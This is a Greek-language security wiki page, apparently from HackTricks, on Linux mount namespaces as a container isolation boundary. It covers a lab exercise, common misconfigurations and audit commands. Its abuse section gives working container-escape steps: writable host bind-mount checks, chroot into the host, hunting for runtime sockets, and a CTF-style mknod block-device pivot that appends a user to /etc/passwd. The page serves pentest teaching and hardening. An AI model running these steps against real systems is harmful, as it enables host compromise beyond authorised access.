# Χώρος ονομάτων προσαρτήσεων

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ο χώρος ονομάτων προσαρτήσεων ελέγχει τον **mount table** που βλέπει μια διεργασία. Αυτή είναι μία από τις πιο σημαντικές δυνατότητες απομόνωσης των containers, επειδή το root filesystem, τα bind mounts, τα tmpfs mounts, η προβολή του procfs, η έκθεση του sysfs και πολλές βοηθητικές προσαρτήσεις που γίνονται κατά το runtime εκφράζονται μέσω αυτού του πίνακα προσαρτήσεων. Δύο διεργασίες μπορεί και οι δύο να έχουν πρόσβαση σε `/`, `/proc`, `/sys` ή `/tmp`, αλλά σε τι αντιστοιχούν αυτές οι διαδρομές εξαρτάται από τον χώρο ονομάτων προσαρτήσεων στον οποίο βρίσκονται.

Από την οπτική της ασφάλειας των containers, ο χώρος ονομάτων προσαρτήσεων συχνά κάνει τη διαφορά μεταξύ "αυτό είναι ένα προσεκτικά προετοιμασμένο filesystem εφαρμογής" και "αυτή η διεργασία μπορεί άμεσα να δει ή να επηρεάσει το filesystem του host". Γι' αυτό τα bind mounts, τα `hostPath` volumes, οι privileged mount operations και οι εγγραφές/εκθέσεις του `/proc` ή του `/sys` που είναι εγγράψιμες περιστρέφονται γύρω από αυτόν τον χώρο ονομάτων.

## Λειτουργία

Όταν ένα runtime εκκινεί ένα container, συνήθως δημιουργεί έναν καινούριο χώρο ονομάτων προσαρτήσεων, προετοιμάζει ένα root filesystem για το container, προσαρτά το procfs και άλλα βοηθητικά filesystems όπως χρειάζεται, και στη συνέχεια προαιρετικά προσθέτει bind mounts, tmpfs mounts, secrets, config maps ή host paths. Μόλις αυτή η διεργασία τρέχει μέσα στο namespace, το σύνολο των προσαρτήσεων που βλέπει είναι σε μεγάλο βαθμό αποσυνδεδεμένο από την προεπιλεγμένη προβολή του host. Το host μπορεί ακόμα να βλέπει το πραγματικό υποκείμενο filesystem, αλλά το container βλέπει την έκδοση που συνέθεσε για αυτό το runtime.

Αυτό είναι ισχυρό επειδή επιτρέπει στο container να πιστεύει ότι έχει το δικό του root filesystem, παρόλο που ο host εξακολουθεί να διαχειρίζεται τα πάντα. Είναι επίσης επικίνδυνο γιατί αν το runtime εκθέσει λάθος mount, η διεργασία ξαφνικά αποκτά ορατότητα σε πόρους του host που το υπόλοιπο μοντέλο ασφάλειας μπορεί να μην έχει σχεδιαστεί για να προστατεύει.

## Πείραμα

Μπορείτε να δημιουργήσετε έναν ιδιωτικό χώρο ονομάτων προσαρτήσεων με:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Αν ανοίξετε ένα άλλο shell έξω από εκείνο το namespace και ελέγξετε το mount table, θα δείτε ότι το tmpfs mount υπάρχει μόνο μέσα στο απομονωμένο mount namespace. Αυτή είναι μια χρήσιμη άσκηση γιατί δείχνει ότι η mount isolation δεν είναι αφηρημένη θεωρία· ο kernel κυριολεκτικά παρουσιάζει ένα διαφορετικό mount table στην process.
Αν ανοίξετε ένα άλλο shell έξω από εκείνο το namespace και ελέγξετε το mount table, το tmpfs mount θα υπάρχει μόνο μέσα στο απομονωμένο mount namespace.

Μέσα σε containers, μια γρήγορη σύγκριση είναι:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Το δεύτερο παράδειγμα δείχνει πόσο εύκολο είναι για μια runtime configuration να δημιουργήσει μια τεράστια τρύπα στο σύνορο του filesystem.

## Χρήση runtime

Docker, Podman, containerd-based stacks, and CRI-O βασίζονται σε ένα ιδιωτικό mount namespace για τα κανονικά containers. Kubernetes χτίζει πάνω στον ίδιο μηχανισμό για volumes, projected secrets, config maps, και `hostPath` mounts. Incus/LXC περιβάλλοντα επίσης στηρίζονται πολύ σε mount namespaces, ειδικά επειδή τα system containers συχνά εκθέτουν πλουσιότερα και πιο machine-like filesystems απ' ό,τι τα application containers.

Αυτό σημαίνει ότι όταν εξετάζετε ένα πρόβλημα με το container filesystem, συνήθως δεν κοιτάτε ένα απομονωμένο Docker quirk. Κοιτάτε ένα mount-namespace και runtime-configuration πρόβλημα που εκφράζεται μέσω της πλατφόρμας που ξεκίνησε το workload.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές και επικίνδυνο λάθος είναι η έκθεση του host root filesystem ή κάποιου άλλου ευαίσθητου host path μέσω bind mount, για παράδειγμα `-v /:/host` ή ένα writable `hostPath` σε Kubernetes. Σε εκείνο το σημείο, το ερώτημα δεν είναι πλέον "can the container somehow escape?" αλλά μάλλον "πόσο χρήσιμο host περιεχόμενο είναι ήδη άμεσα ορατό και writable;" Ένα writable host bind mount συχνά μετατρέπει το υπόλοιπο του exploit σε απλή υπόθεση τοποθέτησης αρχείων, chrooting, τροποποίησης config, ή ανακάλυψης runtime sockets.

Ένα άλλο κοινό πρόβλημα είναι η έκθεση του host `/proc` ή `/sys` με τρόπους που παρακάμπτουν την ασφαλέστερη container view. Αυτά τα filesystems δεν είναι απλά mounts δεδομένων· είναι διεπαφές προς την κατάσταση του kernel και των processes. Αν το workload φτάνει απευθείας στις host εκδόσεις, πολλές από τις υποθέσεις πίσω από το container hardening παύουν να ισχύουν καθαρά.

Οι read-only protections έχουν επίσης σημασία. Ένα read-only root filesystem δεν ασφαλίζει μαγικά ένα container, αλλά αφαιρεί μεγάλο μέρος του χώρου staging για τον attacker και δυσκολεύει persistence, helper-binary placement, και config tampering. Αντίθετα, ένα writable root ή writable host bind mount δίνει στον attacker χώρο για να προετοιμάσει το επόμενο βήμα.

## Κατάχρηση

Όταν το mount namespace χρησιμοποιείται καταχρηστικά, οι attackers συνήθως κάνουν ένα από τέσσερα πράγματα. Αυτοί **διαβάζουν host data** που θα έπρεπε να μείνει έξω από το container. Αυτοί **τροποποιούν host configuration** μέσω writable bind mounts. Αυτοί **mount ή remount πρόσθετους πόρους** αν το capabilities και seccomp το επιτρέπουν. Ή αυτοί **προσεγγίζουν ισχυρά sockets και runtime state directories** που τους επιτρέπουν να ζητήσουν από την ίδια την container πλατφόρμα περισσότερη πρόσβαση.

Αν το container μπορεί ήδη να δει το host filesystem, το υπόλοιπο του security model αλλάζει αμέσως.

Όταν υποψιάζεστε host bind mount, πρώτα επιβεβαιώστε τι είναι διαθέσιμο και αν είναι writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Εάν το host root filesystem είναι mounted read-write, η direct host access είναι συχνά τόσο απλή όσο:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Αν ο στόχος είναι προνομιακή πρόσβαση στο runtime αντί για άμεσο chrooting, απαριθμήστε τα sockets και την κατάσταση runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Αν το `CAP_SYS_ADMIN` είναι παρόν, ελέγξτε επίσης εάν μπορούν να δημιουργηθούν νέες mounts από μέσα στο container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Πλήρες Παράδειγμα: Two-Shell `mknod` Pivot

Μια πιο εξειδικευμένη διαδρομή κατάχρησης εμφανίζεται όταν ο χρήστης root του container μπορεί να δημιουργήσει block devices, ο host και το container μοιράζονται μια ταυτότητα χρήστη με τρόπο που να είναι χρήσιμος, και ο attacker έχει ήδη ένα foothold χαμηλών προνομίων στον host. Σε αυτή την κατάσταση, το container μπορεί να δημιουργήσει ένα device node όπως το `/dev/sda`, και ο χρήστης του host με χαμηλά προνόμια μπορεί αργότερα να το διαβάσει μέσω του `/proc/<pid>/root/` για τη αντίστοιχη διεργασία του container.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Από τον host, ως ο αντίστοιχος χρήστης χαμηλών δικαιωμάτων, αφού εντοπιστεί το PID του container shell:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Το σημαντικό μάθημα δεν είναι η ακριβής αναζήτηση συμβολοσειράς σε CTF. Είναι ότι η έκθεση του mount-namespace μέσω του `/proc/<pid>/root/` μπορεί να επιτρέψει σε έναν host χρήστη να επαναχρησιμοποιήσει device nodes που δημιουργήθηκαν από container, ακόμα και όταν η cgroup device policy εμπόδισε την άμεση χρήση μέσα στο ίδιο το container.

## Έλεγχοι

Αυτές οι εντολές υπάρχουν για να σας δείξουν την εικόνα του filesystem μέσα στην οποία πράγματι τρέχει η τρέχουσα διεργασία. Στόχος είναι να εντοπίσετε host-derived mounts, εγγράψιμες ευαίσθητες διαδρομές, και οτιδήποτε φαίνεται ευρύτερο από ένα κανονικό application container root filesystem.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Τι είναι ενδιαφέρον εδώ:

- Τα bind mounts από το host, ειδικά τα `/`, `/proc`, `/sys`, runtime state directories, ή socket locations, θα πρέπει να ξεχωρίζουν αμέσως.
- Τα απροσδόκητα read-write mounts είναι συνήθως πιο σημαντικά από μεγάλο αριθμό read-only helper mounts.
- `mountinfo` είναι συχνά το καλύτερο μέρος για να δείτε εάν ένα path είναι πραγματικά host-derived ή overlay-backed.

Αυτοί οι έλεγχοι καθορίζουν **ποιοι πόροι είναι ορατοί σε αυτό το namespace**, **ποιοι προέρχονται από το host**, και **ποιοι από αυτούς είναι εγγράψιμοι ή ευαίσθητοι σε ζητήματα ασφάλειας**.
{{#include ../../../../../banners/hacktricks-training.md}}
